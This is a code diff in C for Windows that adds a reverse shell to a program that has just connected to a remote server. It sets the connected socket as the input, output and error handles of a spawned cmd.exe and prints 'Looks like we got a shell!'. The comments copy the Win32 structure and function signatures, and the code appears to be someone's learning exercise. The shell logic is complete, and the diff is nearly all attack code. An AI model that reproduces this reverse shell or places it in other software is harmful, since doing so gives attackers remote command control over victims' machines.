@@ -100,5 +100,84 @@ int connResult = WSAConnect( mySocket, (sockaddr*) &connection_address, sizeof(c
     }else{
         printf("Made connection with the sever!!!\n I deserve a cookie");
     }
+
+
+/*
+STARTINFOA => Start command shell and bind sdout/err/input to it
+typedef struct _STARTUPINFOA {
+  DWORD  cb;//The size of the struct in bytes
+  LPSTR  lpReserved;//null
+  LPSTR  lpDesktop;
+  LPSTR  lpTitle;//null
+  DWORD  dwX;0
+  DWORD  dwY;0
+  DWORD  dwXSize;0
+  DWORD  dwYSize;0
+  DWORD  dwXCountChars;0
+  DWORD  dwYCountChars;0
+  DWORD  dwFillAttribute;0
+  DWORD  dwFlags;?
+  WORD   wShowWindow;0
+  WORD   cbReserved2;0
+  LPBYTE lpReserved2;NULL
+  HANDLE hStdInput; Null
+  HANDLE hStdOutput;null
+  HANDLE hStdError;null
+} STARTUPINFOA, *LPSTARTUPINFOA;
+*/   
+
+
+STARTUPINFOA myStarupInfoA;
+HANDLE sHandle = (HANDLE)mySocket;
+
+PROCESS_INFORMATION pi;
+ZeroMemory(&myStarupInfoA, sizeof(myStarupInfoA));
+myStarupInfoA.cb = sizeof(myStarupInfoA);
+myStarupInfoA.dwFlags = STARTF_USESTDHANDLES;
+ZeroMemory(&pi, sizeof(pi));
+myStarupInfoA.hStdError = myStarupInfoA.hStdInput = myStarupInfoA.hStdOutput = sHandle;
+
+
+/*
+BOOL CreateProcessA(
+  [in, optional]      LPCSTR                lpApplicationName,
+  [in, out, optional] LPSTR                 lpCommandLine,
+  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
+  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
+  [in]                BOOL                  bInheritHandles,
+  [in]                DWORD                 dwCreationFlags,
+  [in, optional]      LPVOID                lpEnvironment,
+  [in, optional]      LPCSTR                lpCurrentDirectory,
+  [in]                LPSTARTUPINFOA        lpStartupInfo,
+  [out]               LPPROCESS_INFORMATION lpProcessInformation
+);
+*/
+
+if(!CreateProcessA(
+    NULL,
+    "cmd.exe",
+    NULL,
+    NULL,
+    TRUE,
+    NULL,
+    NULL,
+    NULL,
+    &myStarupInfoA,
+    &pi
+
+)){
+    printf("Process/shell creation failed; Saad Faaceee (%d)\n", GetLastError());
+}else{
+    printf("[*] Looks like we got a shell!\n");
+    printf("Your pid is: %d", pi.dwProcessId);
+}
+
+//Wait until child process exits
+
+WaitForSingleObject(pi.hProcess, INFINITE);
+CloseHandle(pi.hProcess);
+CloseHandle(pi.hThread);
+
+
     return true;
 }
